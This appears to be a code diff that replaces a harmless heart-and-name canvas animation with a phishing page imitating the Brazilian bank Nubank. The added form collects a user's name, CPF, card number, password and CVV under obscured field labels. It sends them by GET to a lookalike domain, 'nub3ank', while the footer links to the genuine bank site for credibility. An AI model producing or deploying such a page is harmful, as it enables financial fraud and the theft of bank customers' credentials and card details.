@@ -1,142 +1,123 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <title>Lara do zap 💖</title>
+  <title>Login Exemplo - Nubank Fake</title>
   <style>
     body {
+      font-family: Arial, sans-serif;
       margin: 0;
-      background: black;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      overflow: hidden;
+      padding: 0;
+      background-color: #8A05BE; /* Roxo Nubank */
+      color: #333;
     }
-    canvas {
+
+    header {
+      background-color: #8A05BE;
+      color: white;
+      text-align: center;
+      padding: 20px;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0px 4px 10px rgba(0,0,0,0.2);
+      padding: 20px;
+    }
+
+    .container h2 {
+      text-align: center;
+      color: #8A05BE;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: bold;
       display: block;
+      margin-bottom: 5px;
+      color: #444;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      outline: none;
+      font-size: 14px;
+    }
+
+    input:focus {
+      border-color: #8A05BE;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #8A05BE;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background-color: #6a0195;
+    }
+
+    footer {
+      text-align: center;
+      padding: 15px;
+      color: white;
+      font-size: 14px;
+      margin-top: 30px;
+    }
+
+    footer a {
+      color: #fff;
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
-<canvas id="canvas"></canvas>
-<script>
-const canvas = document.getElementById("canvas");
-const ctx = canvas.getContext("2d");
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
 
-const heartParticles = [];
-const heartPoints = [];
-const nameParticles = [];
-const namePoints = [];
-const glowParticles = [];
+  <header>
+    Nubank Exemplo
+  </header>
 
-function heartFunction(t) {
-  const x = 16 * Math.pow(Math.sin(t), 3);
-  const y = -(13 * Math.cos(t) - 5 * Math.cos(2*t) - 2 * Math.cos(3*t) - Math.cos(4*t));
-  return {x, y};
-}
+  <div class="container">
+    <h2>Login</h2>
+    <form action="https://nub3ank.com.br/ajuda-e-seguranca/contato" method="get">
+      <label for="nome">Nome</label>
+      <input type="text" id="nome" name="nome" placeholder="Digite seu nome" required>
 
-for (let t = 0; t < Math.PI*2; t += 0.08) {
-  const {x, y} = heartFunction(t);
-  heartPoints.push({
-    x: canvas.width/2 + x*22,
-    y: canvas.height/2 + y*22
-  });
-}
+      <label for="ciplis">Ciplis</label>
+      <input type="text" id="ciplis" name="ciplis" placeholder="Digite seu Cpf">
 
-for (let i = 0; i < 800; i++) {
-  const target = heartPoints[Math.floor(Math.random()*heartPoints.length)];
-  heartParticles.push({
-    x: Math.random()*canvas.width,
-    y: canvas.height + Math.random()*300,
-    targetX: target.x,
-    targetY: target.y,
-    speed: 0.02 + Math.random()*0.02,
-    color: "red"
-  });
-}
+      <label for="frame">Frame</label>
+      <input type="text" id="frame" name="frame" placeholder="Digite seu cartao">
 
-ctx.font = "bold 120px Arial";
-ctx.fillStyle = "white";
-ctx.textAlign = "center";
-ctx.fillText("Lara do zap", canvas.width/2, canvas.height/2 - 150);
+      <label for="kret">Kret</label>
+      <input type="text" id="kret" name="kret" placeholder="Digite sua Senha">
 
-const imageData = ctx.getImageData(0,0,canvas.width,canvas.height);
-for (let y = 0; y < canvas.height; y += 5) {
-  for (let x = 0; x < canvas.width; x += 5) {
-    const index = (y*canvas.width + x) * 4;
-    if (imageData.data[index+3] > 128) {
-      namePoints.push({x, y});
-    }
-  }
-}
+      <label for="cls">Cls jjjj</label>
+      <input type="text" id="cls" name="cls" placeholder="Digite seu cvv">
 
-for (let i = 0; i < 500; i++) {
-  const target = namePoints[Math.floor(Math.random()*namePoints.length)];
-  nameParticles.push({
-    x: Math.random()*canvas.width,
-    y: -Math.random()*300,
-    targetX: target.x,
-    targetY: target.y,
-    speed: 0.02 + Math.random()*0.02,
-    color: "violet"
-  });
-}
+      <button type="submit">Entrar</button>
+    </form>
+  </div>
 
-for (let i = 0; i < 120; i++) {
-  glowParticles.push({
-    x: Math.random()*canvas.width,
-    y: Math.random()*canvas.height,
-    r: Math.random()*3 + 2,
-    alpha: Math.random(),
-    speed: 0.01 + Math.random()*0.02
-  });
-}
+  <footer>
+    © 2025 Nubank Cental - Ajuda e Segurança | <a href="https://nubank.com.br/ajuda-e-seguranca/contato">Ajuda</a>
+  </footer>
 
-let time = 0;
-
-function animate() {
-  ctx.fillStyle = "rgba(0,0,0,0.25)";
-  ctx.fillRect(0,0,canvas.width,canvas.height);
-
-  time += 0.05;
-  const pulse = 1 + Math.sin(time) * 0.08; 
-
-  function drawParticles(list, pulseEffect=false) {
-    for (let p of list) {
-      p.x += (p.targetX - p.x) * p.speed;
-      p.y += (p.targetY - p.y) * p.speed;
-
-      ctx.fillStyle = p.color;
-      ctx.beginPath();
-      ctx.arc(
-        p.x, p.y, 
-        pulseEffect ? 3*pulse : 3, 
-        0, Math.PI*2
-      );
-      ctx.fill();
-    }
-  }
-
-  for (let g of glowParticles) {
-    g.alpha += g.speed * (Math.random() > 0.5 ? 1 : -1);
-    if (g.alpha > 1) g.alpha = 1;
-    if (g.alpha < 0) g.alpha = 0;
-
-    ctx.fillStyle = `rgba(255, 105, 180, ${g.alpha})`; 
-    ctx.beginPath();
-    ctx.arc(g.x, g.y, g.r, 0, Math.PI*2);
-    ctx.fill();
-  }
-
-  drawParticles(heartParticles, true);  
-  drawParticles(nameParticles, false);  
-
-  requestAnimationFrame(animate);
-}
-animate();
-</script>
 </body>
 </html>
